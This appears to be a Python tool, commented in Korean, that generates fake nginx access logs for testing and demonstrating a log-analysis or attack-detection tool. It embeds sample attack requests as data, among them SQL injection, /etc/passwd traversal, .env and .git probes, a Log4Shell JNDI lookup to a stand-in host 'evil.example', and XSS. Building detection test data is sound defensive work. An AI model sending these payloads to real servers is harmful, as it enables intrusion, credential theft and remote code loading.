"""테스트/시연용 가상 nginx 로그 생성: python tools/make_samples.py

samples/nginx_access.log   : 직접 접속(여러 IP)에 공격이 섞인 로그
samples/nginx_clean.log    : 이상 없는 로그
samples/nginx_behind_lb.log: LB 뒤라 모든 요청이 한 IP로 찍힌 로그(X-Forwarded-For 없음)
samples/nginx_xff.log      : LB 뒤지만 X-Forwarded-For가 기록된 로그
samples/nginx_json.log     : JSON 형식 로그
모두 가상 데이터이며 IP는 문서용 대역(192.0.2.x, 198.51.100.x, 203.0.113.x)이다.
"""
import json
import os
import random

OUT = os.path.join(os.path.dirname(os.path.dirname(os.path.abspath(__file__))), "samples")
UA_WEB = ["Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/118.0 Safari/537.36",
          "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 Mobile/15E148"]
PAGES = ["/", "/index.html", "/about", "/products?id=%d", "/news/view?id=%d", "/api/list?page=%d", "/static/app.js", "/static/style.css"]


def fmt(ip, sec, req, status, size, ua, xff=None, user="-"):
    h, m, s = 9 + sec // 3600, (sec // 60) % 60, sec % 60
    t = "08/Oct/2026:%02d:%02d:%02d +0900" % (h, m, s)
    line = '%s - %s [%s] "%s" %d %d "-" "%s"' % (ip, user, t, req, status, size, ua)
    return line + (' "%s"' % xff if xff is not None else "")


def normal(rng, n, ips, lb=None, xff=False):
    rows = []
    for _ in range(n):
        ip = rng.choice(ips)
        sec = rng.randint(0, 8 * 3600)
        page = rng.choice(PAGES)
        req = "GET " + (page % rng.randint(1, 500) if "%d" in page else page) + " HTTP/1.1"
        rows.append((sec, ip, req, 200, rng.randint(300, 9000), rng.choice(UA_WEB)))
    return rows


def attacks():
    a = []
    # 203.0.113.9: SQLi + 스캐너 (일부 200 응답)
    for i, p in enumerate(["/news/view?id=1%27%20UNION%20SELECT%20user,pass%20FROM%20users--",
                           "/products?id=1%20AND%20SLEEP(5)--", "/news/view?id=1'%20OR%20'1'='1"]):
        a.append((3600 + i * 3, "203.0.113.9", "GET " + p + " HTTP/1.1", 200 if i == 0 else 500, 4200, "sqlmap/1.7"))
    # 198.51.100.20: 경로 탐색 + 취약경로
    for i, p in enumerate(["/../../etc/passwd", "/.env", "/.git/config", "/wp-login.php", "/phpmyadmin/"]):
        a.append((7200 + i * 2, "198.51.100.20", "GET " + p + " HTTP/1.1", 404, 153, "Mozilla/5.0 (compatible; scan)"))
    # 192.0.2.77: Log4Shell + XSS
    a.append((9000, "192.0.2.77", "GET /?x=${jndi:ldap://evil.example/a} HTTP/1.1", 400, 150, "curl/8.0"))
    a.append((9002, "192.0.2.77", "GET /search?q=%3Cscript%3Ealert(1)%3C/script%3E HTTP/1.1", 200, 800, "Mozilla/5.0"))
    # 192.0.2.88: 비정상 Method + TLS 바이너리
    a.append((12000, "192.0.2.88", "PUT /upload/x.jsp HTTP/1.1", 405, 150, "Mozilla/5.0"))
    a.append((12010, "192.0.2.88", "\\x16\\x03\\x01\\x02\\x00\\x01\\x00\\x01\\xFC\\x03\\x03", 400, 150, "-"))
    # 198.51.100.50: 로그인 무차별 대입
    for i in range(30):
        a.append((15000 + i * 5, "198.51.100.50", "POST /account/login HTTP/1.1", 401, 120, "Mozilla/5.0"))
    # 198.51.100.60: 없는 경로 탐색
    for i in range(25):
        a.append((20000 + i, "198.51.100.60", "GET /admin%d.php HTTP/1.1" % i, 404, 153, "Mozilla/5.0"))
    return a


def write(name, rows, xff=False, ua_none=False):
    rows.sort(key=lambda r: r[0])
    with open(os.path.join(OUT, name), "w", encoding="utf-8", newline="\n") as f:
        for sec, ip, req, st, size, ua in rows:
            f.write(fmt(ip, sec, req, st, size, ua, xff=(ip if xff is True else None)) + "\n")


def main():
    os.makedirs(OUT, exist_ok=True)
    rng = random.Random(7)
    users = ["175.223.%d.%d" % (rng.randint(1, 250), rng.randint(1, 250)) for _ in range(40)]
    write("nginx_clean.log", normal(rng, 600, users))
    write("nginx_access.log", normal(rng, 800, users) + attacks())
    # LB 뒤, XFF 없음: 모든 요청이 10.0.0.5
    rows = [(s, "10.0.0.5", r, st, sz, ua) for s, _ip, r, st, sz, ua in normal(rng, 800, users) + attacks()]
    write("nginx_behind_lb.log", rows)
    # LB 뒤, XFF 기록: 접속 IP는 10.0.0.5, 마지막 필드가 실제 IP
    rows = normal(rng, 800, users) + attacks()
    rows.sort(key=lambda r: r[0])
    with open(os.path.join(OUT, "nginx_xff.log"), "w", encoding="utf-8", newline="\n") as f:
        for sec, ip, req, st, sz, ua in rows:
            f.write(fmt("10.0.0.5", sec, req, st, sz, ua, xff=ip) + "\n")
    # JSON
    with open(os.path.join(OUT, "nginx_json.log"), "w", encoding="utf-8", newline="\n") as f:
        for sec, ip, req, st, sz, ua in rows:
            f.write(json.dumps({"time_iso8601": "2026-10-08T%02d:%02d:%02d+09:00" % (9 + sec // 3600, (sec // 60) % 60, sec % 60),
                                "remote_addr": ip, "request": req, "status": st, "body_bytes_sent": sz,
                                "http_user_agent": ua, "http_x_forwarded_for": ""}) + "\n")


if __name__ == "__main__":
    main()
